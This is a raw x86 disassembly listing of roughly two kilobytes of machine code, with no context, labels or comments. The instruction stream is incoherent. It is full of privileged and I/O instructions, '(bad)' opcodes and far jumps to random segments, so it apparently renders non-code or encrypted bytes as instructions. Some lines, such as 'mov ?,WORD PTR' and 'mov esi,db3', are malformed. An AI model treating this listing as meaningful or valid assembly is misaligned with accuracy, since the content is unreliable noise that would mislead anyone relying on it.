  406997:	repnz scas al,BYTE PTR es:[edi]
  406999:	push   ecx
  40699a:	hlt    
  40699b:	sbb    ah,BYTE PTR [edi+0x4bc9ca81]
  4069a1:	push   0x45
  4069a3:	clc    
  4069a4:	es dec esp
  4069a6:	or     DWORD PTR [ecx+ebx*2+0x75f2603b],0x6855077f
  4069b1:	frstor [edx+0x1569188e]
  4069b7:	mov    ch,0x91
  4069b9:	sti    
  4069ba:	into   
  4069bb:	cmp    al,0xb7
  4069bd:	dec    eax
  4069be:	sub    bh,dh
  4069c0:	iret   
  4069c1:	xlat   BYTE PTR ds:[ebx]
  4069c2:	iret   
  4069c3:	out    dx,eax
  4069c4:	ja     0x406956
  4069c6:	inc    edx
  4069c7:	nop
  4069c8:	fdivr  DWORD PTR [edi-0x31]
  4069cb:	xor    bl,dh
  4069cd:	or     BYTE PTR [esi],bh
  4069cf:	repnz enter 0xb154,0xa3
  4069d4:	or     dh,BYTE PTR [esi-0x40]
  4069d7:	mov    cl,0x4b
  4069d9:	xor    al,bl
  4069db:	mov    edi,ebx
  4069dd:	enter  0xf147,0x4d
  4069e1:	jns    0x4069e5
  4069e3:	pushf  
  4069e4:	jns    0x4069b5
  4069e6:	inc    esi
  4069e7:	ins    BYTE PTR es:[edi],dx
  4069e8:	push   0xe209412e
  4069ed:	stc    
  4069ee:	add    al,0x5
  4069f0:	popf   
  4069f1:	ja     0x406a24
  4069f3:	inc    edx
  4069f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069f5:	iret   
  4069f6:	dec    edi
  4069f7:	test   al,0xf5
  4069f9:	outs   dx,BYTE PTR ds:[esi]
  4069fa:	fadd   st,st(5)
  4069fc:	inc    esp
  4069fd:	dec    edi
  4069ff:	and    ebx,DWORD PTR [ecx+0xd]
  406a02:	pusha  
  406a03:	lahf   
  406a04:	xor    DWORD PTR [eax+0x6f],ebx
  406a07:	(bad)  
  406a08:	div    esi
  406a0a:	shl    bl,0x14
  406a0d:	xor    al,0xdb
  406a0f:	dec    edi
  406a10:	inc    edx
  406a11:	jecxz  0x4069e9
  406a13:	data16 aad 0xe2
  406a16:	add    dh,bh
  406a18:	popf   
  406a19:	mov    cl,0x85
  406a1b:	jecxz  0x4069cd
  406a1d:	push   ss
  406a1e:	add    ebx,eax
  406a20:	xchg   ecx,eax
  406a21:	cmp    eax,ecx
  406a23:	sbb    ebx,ebx
  406a25:	(bad)  
  406a26:	cs dec edx
  406a28:	adc    DWORD PTR [ebp-0x49fbf0a8],ecx
  406a2e:	jge    0x406a93
  406a30:	and    edi,DWORD PTR [ecx]
  406a32:	mov    BYTE PTR [edi+0x1b],cl
  406a35:	dec    eax
  406a36:	imul   edi,ebx,0x23
  406a39:	dec    ecx
  406a3a:	adc    al,0x12
  406a3c:	push   ebp
  406a3d:	inc    ecx
  406a3e:	xchg   edx,eax
  406a3f:	fdivr  st(2),st
  406a41:	es xchg edi,eax
  406a43:	adc    ebx,DWORD PTR [ecx+0x2356997f]
  406a49:	inc    ebp
  406a4a:	dec    edi
  406a4b:	mov    ebp,DWORD PTR [eax-0x68bb8d00]
  406a51:	bound  esi,QWORD PTR [esi+0x3f6b916d]
  406a57:	pop    ecx
  406a58:	rcl    DWORD PTR [ecx-0x38],1
  406a5b:	leave  
  406a5c:	sub    DWORD PTR [ecx],esp
  406a5e:	std    
  406a5f:	or     eax,0xeba7259
  406a64:	jne    0x406a3a
  406a66:	in     eax,0xd
  406a68:	mov    eax,0xc2194f82
  406a6d:	mov    cl,0x7f
  406a6f:	icebp  
  406a70:	and    al,0x98
  406a72:	jae    0x406a9b
  406a74:	pmaddwd mm2,QWORD PTR es:[ebp-0x3dd9dab1]
  406a7c:	push   ecx
  406a7d:	lods   al,BYTE PTR ds:[esi]
  406a7e:	ror    DWORD PTR [eax],0x4a
  406a81:	push   ecx
  406a82:	loopne 0x406a3e
  406a84:	push   0x8c308a5b
  406a89:	repnz xchg ebp,eax
  406a8b:	shl    BYTE PTR [ebx],0x30
  406a8e:	push   es
  406a8f:	nop
  406a90:	pop    edi
  406a91:	retf   
  406a92:	or     al,BYTE PTR [eax+0x1c]
  406a95:	ret    0x6521
  406a98:	jne    0x406ade
  406a9a:	push   es
  406a9b:	jae    0x406b00
  406a9d:	nop
  406a9e:	loop   0x406aad
  406aa0:	xchg   ecx,eax
  406aa1:	inc    ebp
  406aa2:	sbb    ebx,DWORD PTR [ebx]
  406aa4:	call   0x7d308776
  406aa9:	pop    ecx
  406aaa:	push   edx
  406aab:	es sub ecx,0xffffff95
  406aaf:	(bad)  
  406ab0:	icebp  
  406ab1:	addr16 xor cl,ch
  406ab4:	xchg   esi,eax
  406ab5:	sahf   
  406ab6:	out    0xba,al
  406ab8:	out    0xe6,eax
  406aba:	xor    ebx,DWORD PTR [esi+0x4c6c65cf]
  406ac0:	cmp    ah,BYTE PTR [ebp+0x26]
  406ac3:	cmc    
  406ac4:	sbb    BYTE PTR [edx+0x4e3007c],0x1
  406acb:	das    
  406acc:	cs scas eax,DWORD PTR es:[edi]
  406ace:	(bad)
  406ad2:	jg     0x406aa4
  406ad4:	sub    DWORD PTR [ecx+0x59b3e87a],eax
  406ada:	imul   esp,DWORD PTR [esi+0x50],0x29543a66
  406ae1:	jno    0x406adb
  406ae3:	inc    esp
  406ae4:	das    
  406ae5:	mov    bl,0x5b
  406ae7:	aas    
  406ae8:	sub    ch,al
  406aea:	jle    0x406b1d
  406aec:	push   0xffffffe8
  406aee:	movzx  eax,BYTE PTR [edi+0x7d]
  406af2:	sti    
  406af3:	mov    ah,0x61
  406af5:	out    0xf3,eax
  406af7:	sub    al,0x24
  406af9:	inc    esp
  406afa:	mov    al,ds:0x41912bf
  406aff:	and    al,0xa3
  406b01:	sbb    eax,0x6a2a7b3
  406b06:	sbb    DWORD PTR [ecx],eax
  406b08:	scas   al,BYTE PTR es:[edi]
  406b09:	(bad)  
  406b0b:	jo     0x406ac1
  406b0d:	call   0x1b7f:0xd564fa27
  406b14:	ret    0xa2a4
  406b17:	push   esi
  406b18:	int    0x30
  406b1a:	retf   
  406b1b:	sub    DWORD PTR [ebx],ecx
  406b1d:	cmp    BYTE PTR [ecx],ah
  406b1f:	mov    esi,0xf27aecd5
  406b24:	scas   eax,DWORD PTR es:[edi]
  406b25:	adc    ah,0x86
  406b28:	fidivr WORD PTR ds:0x61431546
  406b2e:	and    al,0x36
  406b30:	test   eax,0x104853c5
  406b35:	push   ecx
  406b36:	or     edi,DWORD PTR [esi]
  406b38:	(bad)  
  406b39:	mov    ebp,0x8ea4e61a
  406b3e:	cmp    BYTE PTR [edx+0x22c5dbde],bl
  406b44:	mov    eax,0x2475be6
  406b49:	mov    ebp,0x7c352baf
  406b4e:	mov    dl,0xb4
  406b50:	mov    bl,0x2d
  406b52:	xor    edx,esi
  406b54:	push   ds
  406b55:	sub    esp,ebx
  406b57:	add    eax,0x5e08f26b
  406b5c:	dec    edi
  406b5d:	in     al,dx
  406b5e:	and    al,0x96
  406b60:	into   
  406b61:	movsx  esi,BYTE PTR [edx-0x2d3c748b]
  406b68:	in     al,0xef
  406b6a:	xchg   esp,eax
  406b6b:	mov    dh,0x2d
  406b6d:	dec    edi
  406b6e:	inc    edi
  406b6f:	lahf   
  406b70:	xchg   edi,eax
  406b71:	sar    BYTE PTR [edi+0x4c],1
  406b74:	mov    esp,0x29fa359
  406b79:	sahf   
  406b7a:	xor    DWORD PTR [ecx-0x1c],0xffffffad
  406b7e:	or     esi,DWORD PTR [eax]
  406b80:	pop    ss
  406b81:	fucomp st(4)
  406b83:	std    
  406b84:	test   al,0x87
  406b86:	dec    esp
  406b87:	dec    eax
  406b88:	pop    edx
  406b89:	jmp    0x76e7:0x2ce3b817
  406b90:	dec    eax
  406b91:	rcr    BYTE PTR [esi-0x73],0xc
  406b95:	enter  0xb6f2,0x12
  406b99:	xchg   ebp,eax
  406b9a:	mov    ecx,0xf52dcb5
  406b9f:	clc    
  406ba0:	pop    ecx
  406ba1:	gs xchg esi,eax
  406ba3:	fld1   
  406ba5:	imul   eax,DWORD PTR [ebx],0x32
  406ba8:	xor    ax,0xe537
  406bac:	dec    esp
  406bad:	jb     0x406bba
  406baf:	fwait
  406bb0:	sbb    eax,0xa6593b46
  406bb5:	cmc    
  406bb6:	jmp    0x406b77
  406bb8:	and    BYTE PTR [edi+0x55],cl
  406bbb:	pop    edx
  406bbc:	mov    ?,WORD PTR [ebx+0x1eb4f95b]
  406bc2:	scas   eax,DWORD PTR es:[edi]
  406bc3:	lds    esi,FWORD PTR ds:0x4a9d204c
  406bc9:	(bad)  
  406bcb:	popf   
  406bcc:	xor    bl,BYTE PTR [edx]
  406bce:	bound  ecx,QWORD PTR [ebx]
  406bd0:	addr16 jmp 0xf2ba:0xa5667d92
  406bd8:	shr    ah,cl
  406bda:	push   0x43
  406bdc:	into   
  406bdd:	cmp    eax,0xc8ef16d8
  406be2:	jns    0x406c18
  406be4:	inc    ebx
  406be5:	hlt    
  406be6:	(bad)  
  406be7:	mov    ebx,0x28b4f982
  406bec:	jge    0x406c1e
  406bee:	mov    esi,0x63a08225
  406bf3:	inc    esi
  406bf4:	outs   dx,DWORD PTR ds:[esi]
  406bf5:	stos   BYTE PTR es:[edi],al
  406bf6:	sbb    DWORD PTR [ebp-0x3ab1fffc],ebx
  406bfc:	out    0x81,eax
  406bfe:	je     0x406bcd
  406c00:	xchg   ecx,eax
  406c01:	lock and eax,0x2a2d6e5e
  406c07:	sbb    ah,BYTE PTR [ecx]
  406c09:	(bad)  
  406c0b:	aas    
  406c0c:	pop    esi
  406c0d:	das    
  406c0e:	loop   0x406bd7
  406c10:	popf   
  406c11:	cmp    DWORD PTR [esi+0x34d41b66],0x7763e28a
  406c1b:	ins    BYTE PTR es:[edi],dx
  406c1c:	pop    eax
  406c1d:	ins    DWORD PTR es:[edi],dx
  406c1e:	xchg   edx,eax
  406c1f:	dec    esp
  406c20:	sbb    eax,0x5a2eca05
  406c25:	inc    edx
  406c26:	inc    edx
  406c27:	and    cl,BYTE PTR [ebx]
  406c29:	pop    edi
  406c2a:	xchg   edx,eax
  406c2b:	pop    ecx
  406c2c:	push   ebp
  406c2d:	jno    0x406c58
  406c2f:	ja     0x406c12
  406c31:	jne    0x406c7e
  406c33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c34:	mov    DWORD PTR [edi-0x27],esi
  406c37:	sbb    bl,BYTE PTR [edx]
  406c39:	sub    al,0x6f
  406c3b:	jmp    0xab5f:0x63ac202a
  406c42:	xchg   edx,eax
  406c43:	out    dx,eax
  406c44:	repz xchg ecx,eax
  406c46:	mov    ebp,0x5b0f2f31
  406c4b:	ror    ebp,cl
  406c4d:	pusha  
  406c4e:	(bad)  
  406c4f:	(bad)  
  406c50:	adc    al,0xe9
  406c52:	ja     0x406cbf
  406c54:	cdq    
  406c55:	jle    0x406c18
  406c57:	out    0x1a,al
  406c59:	imul   eax,esp,0x6c
  406c5c:	jno    0x406c13
  406c5e:	ret    0x7c49
  406c61:	mov    edi,0x2a21464f
  406c66:	jg     0x406c01
  406c68:	(bad)  
  406c69:	loope  0x406c8e
  406c6b:	(bad)  
  406c6c:	pmuludq mm5,QWORD PTR [ebp+0x62d78cac]
  406c73:	into   
  406c74:	mov    al,BYTE PTR [ebp-0x35f5b7bd]
  406c7a:	pushf  
  406c7b:	mov    BYTE PTR [ebx-0x59],ch
  406c7e:	mov    bl,0x5b
  406c80:	dec    eax
  406c81:	or     eax,0x4dae944d
  406c86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c87:	pushf  
  406c88:	scas   eax,DWORD PTR es:[edi]
  406c89:	cmc    
  406c8a:	mov    DWORD PTR [esi+0x65ac5a92],esp
  406c90:	stc    
  406c91:	shl    edx,0x92
  406c94:	xor    eax,0xdaec31f0
  406c99:	xchg   edx,eax
  406c9a:	aaa    
  406c9b:	mov    dl,0xcb
  406c9d:	push   eax
  406c9e:	mov    edx,0x5e96775d
  406ca3:	stc    
  406ca4:	test   al,0xbc
  406ca6:	push   ss
  406ca7:	into   
  406ca8:	pop    eax
  406ca9:	ss cmp bl,ah
  406cac:	jbe    0x406c8f
  406cae:	fstp   DWORD PTR [eax]
  406cb0:	pushf  
  406cb1:	adc    eax,0x1cd73889
  406cb6:	hlt    
  406cb7:	xlat   BYTE PTR ds:[ebx]
  406cb8:	test   eax,0x106e25c9
  406cbd:	data16 jae 0x406c53
  406cc0:	mov    ds:0xd972bc1a,eax
  406cc5:	or     eax,0xcd5a4b08
  406cca:	mov    ecx,0x6c2758e4
  406ccf:	(bad)  
  406cd0:	cld    
  406cd1:	or     edi,esi
  406cd3:	jle    0x406d10
  406cd5:	mov    ch,0xb
  406cd7:	pop    eax
  406cd8:	shr    BYTE PTR [ecx+0x68dca82d],cl
  406cde:	cli    
  406cdf:	(bad)  
  406ce0:	je     0x406d2d
  406ce2:	call   0xef12:0xa562764
  406ce9:	inc    DWORD PTR ds:0x8504f18c
  406cef:	sbb    ebp,DWORD PTR [edi]
  406cf1:	mov    bh,0xb4
  406cf3:	xchg   esp,eax
  406cf4:	pop    edx
  406cf5:	in     al,dx
  406cf6:	(bad)
  406cfa:	pop    ss
  406cfb:	jbe    0x406d60
  406cfd:	(bad)  
  406d00:	xchg   edx,eax
  406d01:	mov    gs,WORD PTR [ebp+edi*8-0x2f726f84]
  406d08:	cmp    al,0x54
  406d0a:	les    edi,FWORD PTR [edx+esi*8]
  406d0d:	mov    esi,0x7cb867cb
  406d12:	fcomip st,st(7)
  406d14:	mov    dl,0xe1
  406d16:	jmp    0x406cfe
  406d18:	jecxz  0x406ce6
  406d1a:	sbb    ch,BYTE PTR ds:0x3df4a65a
  406d20:	and    DWORD PTR [ebx],esp
  406d22:	xor    DWORD PTR [edx+0x5be01d27],esp
  406d28:	jge    0x406cd9
  406d2a:	add    al,0xe5
  406d2c:	adc    DWORD PTR [edi],edx
  406d2e:	and    al,0x58
  406d30:	mov    dh,0xfd
  406d32:	sub    eax,0x9133f990
  406d37:	out    0x29,al
  406d39:	shl    BYTE PTR [edx+ecx*1-0x5c11da12],cl
  406d40:	int    0x5a
  406d42:	xlat   BYTE PTR ds:[ebx]
  406d43:	or     ah,bh
  406d45:	sbb    al,0x7
  406d47:	sbb    eax,0xfe02e7b
  406d4c:	retf   
  406d4d:	sub    ebp,DWORD PTR [esi+edx*8]
  406d50:	(bad)  
  406d51:	iret   
  406d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d53:	int3   
  406d54:	mov    ah,0x10
  406d56:	out    0x39,eax
  406d58:	or     ch,bl
  406d5a:	dec    eax
  406d5b:	stc    
  406d5c:	xchg   edx,eax
  406d5d:	leave  
  406d5e:	stos   DWORD PTR es:[edi],eax
  406d5f:	sti    
  406d60:	fdiv   st,st(2)
  406d62:	int3   
  406d63:	mov    esi,0xd7eb39f2
  406d68:	jge    0x406d7d
  406d6a:	sub    al,0x92
  406d6c:	test   al,0x25
  406d6e:	int    0xbb
  406d70:	push   edi
  406d71:	ins    BYTE PTR es:[edi],dx
  406d72:	jb     0x406d47
  406d74:	fisub  DWORD PTR [edi+0x4b271f41]
  406d7a:	or     bl,BYTE PTR [ebp-0x6ec2ede0]
  406d80:	sbb    DWORD PTR [edx+0x46],ecx
  406d83:	xlat   BYTE PTR ds:[ebx]
  406d84:	(bad)  
  406d85:	gs cmp al,0xc4
  406d88:	xchg   esi,eax
  406d89:	pop    esp
  406d8a:	xchg   BYTE PTR [eax-0xa1e5164],bh
  406d90:	or     esp,DWORD PTR [ebp+0x6f]
  406d93:	jp     0x406d45
  406d95:	cmp    eax,0xe4d2e622
  406d9a:	repnz cdq 
  406d9c:	or     BYTE PTR [esi+0x35d81f25],bl
  406da2:	ja     0x406e1b
  406da4:	cmp    eax,0x6b56d201
  406da9:	cmp    dh,BYTE PTR [ecx+0x63]
  406dac:	icebp  
  406dad:	pop    edx
  406dae:	mov    ah,0xe7
  406db0:	or     DWORD PTR [ebp+0x7f],0xffffffa5
  406db4:	mov    ah,0x23
  406db6:	mov    eax,ds:0xff3873b8
  406dbb:	stos   BYTE PTR es:[edi],al
  406dbc:	ja     0x406da8
  406dbe:	adc    al,0x75
  406dc0:	or     al,0xcc
  406dc2:	dec    edx
  406dc3:	sub    cl,ch
  406dc5:	leave  
  406dc6:	(bad)  
  406dc7:	xchg   BYTE PTR [ecx],dl
  406dc9:	out    0xbd,eax
  406dcb:	jne    0x406e27
  406dcd:	fdivr  QWORD PTR [edi-0x4f497381]
  406dd3:	clc    
  406dd4:	(bad)  
  406dd5:	push   eax
  406dd6:	stos   DWORD PTR es:[edi],eax
  406dd7:	(bad)  
  406dd8:	neg    DWORD PTR [edx+0x28]
  406ddb:	xor    ebx,DWORD PTR ds:0xbd6d7b97
  406de1:	shl    BYTE PTR [edi-0x2455ce5],0x12
  406de8:	dec    ebp
  406de9:	gs pusha 
  406deb:	push   ecx
  406dec:	test   eax,0x6f2e65d3
  406df1:	or     eax,0x936fc7d5
  406df6:	sub    ch,BYTE PTR [ecx]
  406df8:	lahf   
  406df9:	ds bound ecx,QWORD PTR es:[edi-0x5a]
  406dfe:	pop    ebp
  406dff:	fs nop
  406e01:	cmp    al,0x80
  406e03:	in     eax,0x93
  406e05:	xor    esi,DWORD PTR [ebx]
  406e07:	test   eax,0xd29fb684
  406e0c:	mov    al,0xf1
  406e0e:	or     DWORD PTR [ebp-0xb],ebp
  406e11:	retf   0x7191
  406e14:	aam    0x92
  406e16:	pop    edx
  406e17:	in     al,0x3
  406e19:	pop    ds
  406e1a:	(bad)  
  406e1b:	hlt    
  406e1c:	sbb    DWORD PTR [edx],ebp
  406e1e:	jmp    0x406df6
  406e20:	jge    0x406e47
  406e22:	mov    esp,0xea1b7be7
  406e27:	mov    bl,0x6c
  406e29:	loope  0x406dee
  406e2b:	sub    ebp,DWORD PTR [ebp+0x60]
  406e2e:	out    dx,eax
  406e2f:	or     eax,edi
  406e31:	and    edx,DWORD PTR [ebx]
  406e33:	push   ebx
  406e34:	shl    al,0x1d
  406e37:	sub    dl,BYTE PTR [eax-0x39]
  406e3a:	sahf   
  406e3b:	cmp    BYTE PTR [eax],0xf2
  406e3e:	nop
  406e3f:	jmp    0x406eae
  406e41:	test   DWORD PTR [ebp+0x14],eax
  406e44:	push   esp
  406e45:	ror    DWORD PTR [ebp-0x2c],cl
  406e48:	clc    
  406e49:	psrlw  mm0,QWORD PTR [ebx-0x4a5249ba]
  406e50:	jns    0x406e14
  406e52:	fiadd  WORD PTR [ebp+ebx*1-0x53]
  406e56:	mov    ecx,0x1bfce076
  406e5b:	retf   
  406e5c:	mov    esi,0xecec7b82
  406e61:	out    dx,al
  406e62:	sub    BYTE PTR [esi+0x13487462],al
  406e68:	cmp    DWORD PTR [eax-0x5745998b],eax
  406e6e:	(bad)  [edx+0x28]
  406e71:	pusha  
  406e72:	and    esi,edi
  406e74:	xchg   ebp,eax
  406e75:	(bad)  
  406e76:	call   DWORD PTR [eax]
  406e78:	aas    
  406e79:	js     0x406e14
  406e7b:	cmp    BYTE PTR [esi],al
  406e7d:	xor    al,0x31
  406e7f:	neg    DWORD PTR [ecx-0x2377db91]
  406e85:	lock scas eax,DWORD PTR es:[edi]
  406e87:	jge    0x406e0e
  406e89:	mov    dl,0x8b
  406e8b:	lods   eax,DWORD PTR ds:[esi]
  406e8c:	(bad)  
  406e8d:	test   eax,0xec4b52d7
  406e92:	dec    esp
  406e93:	ja     0x406e8c
  406e95:	pop    esp
  406e96:	pop    ebx
  406e97:	add    edx,eax
  406e99:	cli    
  406e9a:	jmp    0xee33b7f0
  406e9f:	stos   DWORD PTR es:[edi],eax
  406ea0:	jmp    0x406ec4
  406ea2:	je     0x406f01
  406ea4:	pop    eax
  406ea5:	xchg   esi,eax
  406ea6:	xchg   edx,eax
  406ea7:	or     BYTE PTR [eax+0x3f],0xf3
  406eab:	jno    0x406f0c
  406ead:	call   0xef01f204
  406eb2:	cdq    
  406eb3:	xor    BYTE PTR [ebx+0x3499d134],dh
  406eb9:	(bad)  
  406eba:	out    dx,al
  406ebb:	dec    edi
  406ebc:	dec    ebp
  406ebd:	inc    edi
  406ebe:	into   
  406ebf:	shr    BYTE PTR ds:0x6b746d95,0x47
  406ec6:	adc    DWORD PTR [edi],ebx
  406ec8:	sbb    BYTE PTR [edx],al
  406eca:	(bad)
  406ecd:	pop    edx
  406ece:	jae    0x406ede
  406ed0:	sub    al,0x75
  406ed2:	push   eax
  406ed3:	sbb    al,0x64
  406ed5:	jle    0x406f4f
  406ed7:	(bad)  
  406ed8:	mov    ch,0xc1
  406eda:	cmp    bh,BYTE PTR [eax+0x4cd1fc8d]
  406ee0:	jne    0x406f5f
  406ee2:	lea    ebp,[edi-0x7408acd5]
  406ee8:	test   al,0x2d
  406eea:	mov    esi,esp
  406eec:	pop    es
  406eed:	out    dx,eax
  406eee:	daa    
  406eef:	add    ah,cl
  406ef1:	pop    ebx
  406ef2:	das    
  406ef3:	jecxz  0x406f08
  406ef5:	cs fwait
  406ef7:	jb     0x406e89
  406ef9:	and    al,0xe7
  406efb:	mov    esi,db3
  406efe:	mov    ds:0xff5095dd,eax
  406f03:	lods   al,BYTE PTR ds:[esi]
  406f04:	(bad)  
  406f05:	js     0x406f14
  406f07:	mov    dh,0xa0
  406f09:	cld    
  406f0a:	add    ecx,DWORD PTR [ebx+0x59]
  406f0d:	mov    ecx,0x99e9ea5d
  406f12:	int    0xe4
  406f14:	(bad)  
  406f15:	cli    
  406f16:	pop    edx
  406f17:	pop    ds
  406f18:	ds fwait
  406f1a:	and    eax,0x6424be8f
  406f1f:	pop    esp
  406f20:	xchg   esi,eax
  406f21:	(bad)  
  406f22:	mov    edi,0x75734bcf
  406f27:	int    0x1e
  406f29:	jl     0x406ef2
  406f2b:	icebp  
  406f2c:	dec    eax
  406f2d:	retf   0x9326
  406f30:	ja     0x406f78
  406f32:	enter  0xfb73,0x15
  406f36:	lock stc 
  406f38:	retf   
  406f39:	sub    eax,0x8ddf34e6
  406f3e:	scas   al,BYTE PTR es:[edi]
  406f3f:	hlt    
  406f40:	xchg   ebx,eax
  406f41:	loope  0x406ed3
  406f43:	je     0x406f3c
  406f45:	imul   ecx,DWORD PTR [ebp-0x7032929d],0xffffffc0
  406f4c:	inc    ebx
  406f4d:	xchg   BYTE PTR [eax+edi*2],bh
  406f50:	sar    DWORD PTR [eax],cl
  406f52:	retf   
  406f53:	les    esi,FWORD PTR [ecx+0x25]
  406f56:	rol    ebp,0x4a
  406f59:	push   ds
  406f5a:	aas    
  406f5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f5c:	sub    dh,bl
  406f5e:	mov    dh,0x5b
  406f60:	or     ch,bh
  406f62:	sti    
  406f63:	loop   0x406ef8
  406f65:	cmp    BYTE PTR [ebx-0x7a041850],bh
  406f6b:	pop    ds
  406f6c:	(bad)  
  406f6d:	cli    
  406f6e:	inc    ebx
  406f6f:	jg     0x406fac
  406f71:	hlt    
  406f72:	fld    DWORD PTR [edx-0x2fbd36]
  406f78:	sbb    DWORD PTR [ebx+0x793bf4a9],edi
  406f7e:	inc    ebx
  406f7f:	push   ecx
  406f80:	xor    eax,0x747c47e3
  406f85:	cmp    bh,bh
  406f87:	stc    
  406f88:	js     0x406f44
  406f8a:	into   
  406f8b:	xlat   BYTE PTR ds:[ebx]
  406f8c:	cmp    cl,dl
  406f8e:	mov    ebp,0x3dd709c2
  406f93:	jmp    0xc73e:0x8f472f64
  406f9a:	dec    ebp
  406f9b:	sbb    cl,bl
  406f9d:	ret    
  406f9e:	push   eax
  406f9f:	icebp  
  406fa0:	cli    
  406fa1:	add    BYTE PTR [edx-0xb],dl
  406fa4:	rol    BYTE PTR [ecx-0x5ee29a9f],cl
  406faa:	mov    ah,0xe3
  406fac:	loopne 0x407029
  406fae:	cmc    
  406faf:	mov    al,0xb6
  406fb1:	aas    
  406fb2:	es enter 0x3510,0xd
  406fb7:	mov    bh,0x36
  406fb9:	dec    edi
  406fba:	or     BYTE PTR [edx-0x1ed5810a],al
  406fc0:	xchg   BYTE PTR [eax],bl
  406fc2:	cmp    al,0xb6
  406fc4:	dec    ebp
  406fc5:	push   esp
  406fc6:	add    cl,BYTE PTR [ebx-0xc9d075d]
  406fcc:	call   0x5a24d62f
  406fd1:	or     al,0x9b
  406fd3:	and    BYTE PTR [ebp-0x58],al
  406fd6:	retf   
  406fd7:	cmp    al,0x66
  406fd9:	mov    edi,0x227a61ed
  406fde:	retf   0x1887
  406fe1:	shl    DWORD PTR [ebx+0x65],1
  406fe4:	cmp    bh,BYTE PTR [ebx-0x22]
  406fe7:	pop    esi
  406fe8:	inc    DWORD PTR [eax-0x37]
  406feb:	mov    esi,DWORD PTR [eax+0x76]
  406fee:	xchg   esi,eax
  406fef:	add    eax,0x9b5a2ff
  406ff4:	push   ebx
  406ff5:	add    ebx,edx
  406ff7:	push   ss
  406ff8:	lods   eax,DWORD PTR ds:[esi]
  406ff9:	add    DWORD PTR [ebx],esp
  406ffb:	and    BYTE PTR [ebx],bl
  406ffd:	inc    eax
  406ffe:	xor    eax,0xf158369b
  407003:	jo     0x406fe3
  407005:	push   eax
  407006:	bound  eax,QWORD PTR [ebp-0x77ffc509]
  40700c:	imul   edi,ebp,0x68
  40700f:	sbb    DWORD PTR [edi],0x2630eee0
  407015:	es sahf 
  407017:	repnz xchg esp,eax
  407019:	cli    
  40701a:	jge    0x407059
  40701c:	xchg   esp,eax
  40701d:	jno    0x40706e
  40701f:	mov    ch,0x7a
  407021:	adc    eax,0x37e15eb8
  407026:	lahf   
  407027:	in     eax,dx
  407028:	imul   BYTE PTR [edx-0x4b]
  40702b:	pop    ss
  40702c:	and    esp,DWORD PTR [edx+0x6b86d63]
  407032:	jne    0x406fe0
  407034:	dec    esi
  407035:	mov    DWORD PTR [edi],esi
  407037:	ja     0x407072
  407039:	es or  dl,cl
  40703c:	mov    ecx,0x3202d042
  407041:	pop    DWORD PTR [edx+0x60]
  407044:	bound  ebp,QWORD PTR [eax]
  407046:	mov    bh,0x5f
  407048:	mov    eax,0xee5392c0
  40704d:	retf   0xc71c
  407050:	test   dl,bl
  407052:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407053:	mov    edi,0x8396681d
  407058:	jo     0x407090
  40705a:	dec    esi
  40705b:	mov    BYTE PTR [edi+0x709e1156],bl
  407061:	(bad)  
  407062:	adc    DWORD PTR [eax-0x74],esi
  407065:	jne    0x407023
  407067:	clc    
  407068:	mov    ds:0xcb2e9291,eax
  40706d:	dec    esi
  40706e:	(bad)  
  40706f:	enter  0x7f7e,0xd6
  407073:	arpl   WORD PTR [eax],di
  407075:	pop    edx
  407076:	icebp  
  407077:	sbb    ebx,ebp
  407079:	cmovg  esi,edx
  40707c:	outs   dx,BYTE PTR ds:[esi]
  40707d:	push   edi
  40707e:	ss in  eax,0x8b
  407081:	fbstp  TBYTE PTR [esi+0x114e4dd1]
  407087:	xor    DWORD PTR [edi-0x48c72309],0xffffffcb
  40708e:	or     esi,DWORD PTR [ebp+0x49]
  407091:	mov    dl,0x58
  407093:	fistp  DWORD PTR [ecx-0x6d]
  407096:	(bad)  
  407098:	mov    ebp,0x4134de6e
  40709d:	retf   
  40709e:	and    al,BYTE PTR [edi-0x35]
  4070a1:	fs mov esi,0x5fb36e16
  4070a7:	fbstp  TBYTE PTR [esi-0x5f6399b3]
  4070ad:	push   ss
  4070ae:	adc    ebx,ecx
  4070b0:	(bad)  
  4070b1:	add    al,BYTE PTR ds:[edx-0x217425b2]
  4070b8:	xchg   DWORD PTR [ecx+0x57],ebx
  4070bb:	cmp    eax,0x9172c42
  4070c0:	xor    al,0x31
  4070c2:	xchg   esi,eax
  4070c3:	mov    ds:0x1bd3475,eax
  4070c8:	cld    
  4070c9:	ficom  WORD PTR [edi]
  4070cb:	mov    dl,0xd1
  4070cd:	mov    cl,0x70
  4070cf:	fwait
  4070d0:	xor    al,0x92
  4070d2:	in     al,0x1
  4070d4:	xor    DWORD PTR [edx+0x14],ebx
  4070d7:	adc    DWORD PTR [eax+0xf6e85e2],ebx
  4070dd:	dec    esp
  4070de:	fisubr DWORD PTR [eax]
  4070e0:	jp     0x40710c
  4070e2:	add    esi,esi
  4070e4:	mov    ebx,0x1430d7c4
  4070e9:	add    DWORD PTR [edx],0x8f39e60f
  4070ef:	mov    ebp,0xc19bfd30
  4070f4:	xchg   DWORD PTR [ebp+0xd9a0646],esp
  4070fa:	xchg   ebp,eax
  4070fb:	loop   0x4070d6
  4070fd:	or     eax,0x130aa307
  407102:	cmp    eax,0x53ce677f
  407107:	lods   al,BYTE PTR ds:[esi]
  407108:	mov    cl,0x5c
  40710a:	iret   
  40710b:	sub    bl,ch
  40710d:	or     ch,dh
  40710f:	les    edi,FWORD PTR [ebx+0x25dec1a3]
  407115:	push   0x5b1bd99a
  40711a:	cmp    ebx,ebx
  40711c:	push   ebx
  40711d:	hlt    
  40711e:	iret   
  40711f:	stc    
  407120:	pop    ds
  407121:	fstp   DWORD PTR [esi-0x2cf3894a]
  407127:	mov    ah,0x57
  407129:	inc    edx
  40712a:	jg     0x407107
  40712c:	fdivr  st,st(0)
  40712e:	call   0x962228e2
  407133:	push   ds
  407134:	sub    al,0xfc
  407136:	sub    DWORD PTR [ebx+0x2b],ebp
  407139:	inc    edx
  40713a:	ja     0x407153
  40713c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40713d:	add    ebp,DWORD PTR ds:0xd0015b9c
  407143:	(bad)  
  407144:	adc    al,0x92
  407146:	or     dl,dh
  407148:	lods   eax,DWORD PTR ds:[esi]
  407149:	pop    eax
  40714a:	push   ebx
